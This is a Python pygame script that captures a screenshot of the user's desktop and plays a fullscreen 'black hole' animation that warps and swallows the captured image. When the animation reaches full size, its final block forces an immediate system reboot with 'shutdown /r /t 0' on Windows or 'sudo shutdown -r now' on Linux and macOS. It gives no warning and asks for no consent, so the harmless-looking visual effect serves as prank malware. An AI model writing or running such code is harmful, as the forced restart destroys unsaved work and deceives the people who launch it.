import pygame
import sys
import math
import mss
import numpy as np
import os
import platform
import random

# -----------------------------
# Step 1: Take screenshot
# -----------------------------
with mss.mss() as sct:
    monitor = sct.monitors[0]
    img = np.array(sct.grab(monitor))[:, :, :3].astype(np.uint8)

HEIGHT, WIDTH = img.shape[0], img.shape[1]
img = np.transpose(img, (1, 0, 2))  # (width, height, 3)

# -----------------------------
# Step 2: Initialize Pygame
# -----------------------------
pygame.init()
screen = pygame.display.set_mode((WIDTH, HEIGHT), pygame.FULLSCREEN)
clock = pygame.time.Clock()
background = pygame.surfarray.make_surface(img.copy())

# -----------------------------
# Step 3: Black hole parameters
# -----------------------------
BLACK = (0, 0, 0)
ORANGE = (255, 140, 0)

radius = 0
max_radius = math.hypot(WIDTH/2, HEIGHT/2)
speed = 2
expand = True
horizon_thickness = 20
pulse_speed = 0.05
warp_strength = 0.7

# Precompute coordinates
y_indices, x_indices = np.meshgrid(np.arange(HEIGHT), np.arange(WIDTH))
cx, cy = WIDTH/2, HEIGHT/2
dx = x_indices - cx
dy = y_indices - cy
distances = np.hypot(dx, dy) + 1e-5

running = True
restart_triggered = False

while running:
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            pygame.quit()
            sys.exit()

    # Draw background
    screen.blit(background, (0, 0))

    # -----------------------------
    # Vectorized 3D warp
    # -----------------------------
    mask = distances < (radius + horizon_thickness*2)
    factor = 1 - warp_strength * (radius / (distances + 1))**2  # squared for depth
    t = pygame.time.get_ticks() / 500
    angle = np.sin(distances/50 + t) * 0.5  # stronger swirl

    nx = dx * np.cos(angle) - dy * np.sin(angle)
    ny = dx * np.sin(angle) + dy * np.cos(angle)

    # Elliptical distortion for 3D lensing
    nx = nx * 1.0
    ny = ny * 0.9

    nx = (cx + nx*factor).clip(0, WIDTH-1).astype(np.int32)
    ny = (cy + ny*factor).clip(0, HEIGHT-1).astype(np.int32)

    warped_img = img.copy()
    warped_img[nx[mask], ny[mask]] = img[nx[mask], ny[mask]]
    pygame.surfarray.blit_array(screen, warped_img)

    # -----------------------------
    # Black hole core
    # -----------------------------
    pygame.draw.circle(screen, BLACK, (WIDTH//2, HEIGHT//2), int(radius))

    # -----------------------------
    # 3D Event Horizon
    # -----------------------------
    pulse = (math.sin(pygame.time.get_ticks() * pulse_speed) + 1)/2
    num_rings = 5
    for k in range(num_rings):
        offset = k*6 + pulse*12
        glow_radius = int(radius + horizon_thickness + offset)
        thickness = 2 + k
        # shading gradient: inner rings brighter
        color_intensity = max(0, 255 - k*40)
        color = (color_intensity, int(color_intensity*0.55), 0)
        pygame.draw.circle(screen, color, (WIDTH//2, HEIGHT//2), glow_radius, thickness)

    # Energy spikes
    for _ in range(12):
        angle = random.uniform(0, 2*math.pi)
        length = random.uniform(5, 15) + pulse*5
        x1 = WIDTH//2 + int((radius + horizon_thickness) * math.cos(angle))
        y1 = HEIGHT//2 + int((radius + horizon_thickness) * math.sin(angle))
        x2 = WIDTH//2 + int((radius + horizon_thickness + length) * math.cos(angle))
        y2 = HEIGHT//2 + int((radius + horizon_thickness + length) * math.sin(angle))
        pygame.draw.line(screen, ORANGE, (x1, y1), (x2, y2), 2)

    # -----------------------------
    # Expand/shrink logic
    # -----------------------------
    if expand:
        radius += speed
        if radius >= max_radius:
            expand = False
            restart_triggered = True
    else:
        radius -= speed
        if radius <= 0:
            expand = True

    pygame.display.flip()
    clock.tick(60)

    # -----------------------------
    # Restart PC if triggered
    # -----------------------------
    if restart_triggered:
        system = platform.system()
        if system == "Windows":
            os.system("shutdown /r /t 0")
        elif system in ["Linux", "Darwin"]:
            os.system("sudo shutdown -r now")
        restart_triggered = False
